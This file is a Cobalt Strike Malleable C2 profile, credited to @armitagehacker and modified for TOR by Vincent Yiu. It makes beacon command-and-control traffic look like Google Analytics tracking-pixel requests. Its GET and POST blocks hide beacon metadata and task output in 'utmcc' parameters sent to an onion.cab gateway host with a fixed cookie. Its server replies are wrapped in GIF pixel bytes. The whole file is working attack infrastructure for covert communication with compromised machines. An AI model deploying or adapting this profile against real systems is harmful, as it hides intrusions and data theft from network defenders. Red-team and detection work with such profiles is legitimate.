# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker
# Modified by Vincent Yiu @vysecurity for TOR.

set sleeptime "5000";

http-get {
        set uri "/___utm";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";

                metadata {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/__utm";
        set verb "GET";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                output {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "plain/text";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "plain/text";
        }
}

